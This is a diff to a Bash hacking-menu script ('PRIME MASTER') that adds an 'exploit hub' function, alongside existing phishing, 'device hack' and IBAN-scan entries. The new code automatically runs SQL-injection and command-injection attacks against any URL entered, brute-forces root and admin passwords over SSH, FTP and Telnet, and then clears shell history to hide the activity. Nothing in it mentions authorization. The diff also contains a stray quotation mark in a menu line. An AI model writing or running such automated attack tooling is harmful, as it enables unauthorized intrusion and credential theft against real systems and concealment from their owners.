@@ -761,6 +761,40 @@ run_ghost_scan() {
     [ -n "$t" ] && nmap -F "$t"
 }
 
+run_exploit_hub() {
+    clear; zero_clear
+    echo -e "${Y}>>> [ EXPLOIT HUB: AUTO-PILOT MODE ] <<<${NC}"
+    echo -e "${B}Target (URL, IP, or Service):${NC}"
+    read -p ">> " target
+    [ -z "$target" ] && return
+
+    # Эвристика: определяем, какой инструмент запустить
+    if [[ "$target" =~ ^(http|https):// ]]; then
+        echo -e "${G}[+] Web Target detected. Running SQLmap + Commix...${NC}"
+        # Сначала проверяем на SQL-инъекции
+        sqlmap -u "$target" --batch --random-agent --level 2 --threads 5
+        # Затем проверяем на Command Injection (Commix)
+        python3 /root/commix/commix.py --url="$target" --batch
+        
+    elif [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        echo -e "${G}[+] IP Address detected. Running Hydra Bruteforce...${NC}"
+        echo -e "${Y}Select service: 1) SSH  2) FTP  3) Telnet${NC}"
+        read -p ">> " srv
+        case $srv in
+            1) hydra -l root -P /root/passwords.txt ssh://"$target" -t 4 ;;
+            2) hydra -l admin -P /root/passwords.txt ftp://"$target" -t 4 ;;
+            3) hydra -l admin -P /root/passwords.txt telnet://"$target" -t 4 ;;
+        esac
+    else
+        echo -e "${R}[!] Unknown target type. Falling back to Nmap scan...${NC}"
+        nmap -sV "$target"
+    fi
+
+    zero_clear; history -c
+    read -p "Press Enter to return..."
+}
+
+
 run_sqlmap() {
     clear; zero_clear
     echo -e "${Y}>>> [ SQLMAP: SMART INJECTION HUB ] <<<${NC}"
@@ -795,7 +829,7 @@ while true; do
     echo -e "${R}========== [ PRIME MASTER v$CURRENT_VERSION ] ==========${NC}"
     get_stats
     echo -e "${G}G) GHOST SCAN   1) SOCIAL ENG   2) SQLMAP"
-    echo -e "3) SMART OSINT  4) DEVICE HACK  "
+    echo -e "3) SMART OSINT  4) DEVICE HACK   E) EXPLOIT HUB""
     echo -e "6) AIO OSINT AUTO    7) IBAN/RIB SCAN"
     echo -e "U) UPDATE CORE  I) SERVICE HUB  0) EXIT${NC}"
     read -p ">> " opt
@@ -803,7 +837,7 @@ while true; do
         g|G) run_ghost_scan ;; 1) run_phishing ;; 2) run_sqlmap ;; 
         3) run_osint ;; 4) run_device_hack ;; 5|i|I) run_servers ;; 
         6) run_osint2 ;; 7) run_iban_scan ;; u|U) update_prime ;; 
-        0) exit 0 ;;
+        0) exit 0 ;; e) run_exploit_hub ;;
     esac
 done
 EOF
